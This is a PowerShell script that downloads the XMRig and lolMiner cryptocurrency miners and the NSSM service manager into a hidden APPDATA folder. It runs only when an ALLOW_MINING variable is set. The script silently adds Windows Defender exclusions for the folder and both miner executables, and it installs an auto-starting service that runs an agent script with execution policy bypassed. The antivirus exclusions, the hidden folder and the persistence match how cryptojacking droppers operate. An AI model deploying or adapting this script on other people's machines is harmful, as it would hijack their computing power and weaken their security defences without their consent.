# ===== SAFETY =====
if ($env:ALLOW_MINING -ne "1") { exit }

# ===== PATHS =====
$BASE = "$env:APPDATA\.mining"
$BIN  = "$BASE\bin"
$LOG  = "$BASE\log"
New-Item -ItemType Directory -Force -Path "$BIN\cpu","$BIN\gpu","$LOG" | Out-Null

# ===== DOWNLOADS =====
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip"
$lolUrl   = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Win64.zip"

function Get-Zip($url, $dest) {
    $tmp = "$env:TEMP\pkg.zip"
    Invoke-WebRequest $url -OutFile $tmp -UseBasicParsing
    Expand-Archive $tmp $dest -Force
    Remove-Item $tmp -Force
}

if (-not (Test-Path "$BIN\cpu\xmrig.exe")) {
    Get-Zip $xmrigUrl "$BIN\cpu"
}

if (-not (Test-Path "$BIN\gpu\lolMiner.exe")) {
    Get-Zip $lolUrl "$BIN\gpu"
}

# ===== DEFENDER EXCLUSIONS =====
try {
    Add-MpPreference -ExclusionPath $BASE
    Add-MpPreference -ExclusionProcess "$BIN\cpu\xmrig.exe"
    Add-MpPreference -ExclusionProcess "$BIN\gpu\lolMiner.exe"
} catch {}

# ===== INSTALL SERVICE (NSSM) =====
$NSSM = "$BASE\nssm.exe"
if (-not (Test-Path $NSSM)) {
    Invoke-WebRequest "https://nssm.cc/release/nssm-2.24.zip" -OutFile "$env:TEMP\nssm.zip"
    Expand-Archive "$env:TEMP\nssm.zip" "$env:TEMP\nssm" -Force
    Copy-Item "$env:TEMP\nssm\nssm-2.24\win64\nssm.exe" $NSSM -Force
}

$svc = "MiningAgent"
& $NSSM stop $svc 2>$null
& $NSSM remove $svc confirm 2>$null

& $NSSM install $svc "powershell.exe" "-NoProfile -ExecutionPolicy Bypass -File `"$PSScriptRoot\agent.ps1`""
& $NSSM set $svc Start SERVICE_AUTO_START
& $NSSM set $svc AppStdout "$LOG\agent.out.log"
& $NSSM set $svc AppStderr "$LOG\agent.err.log"
& $NSSM start $svc
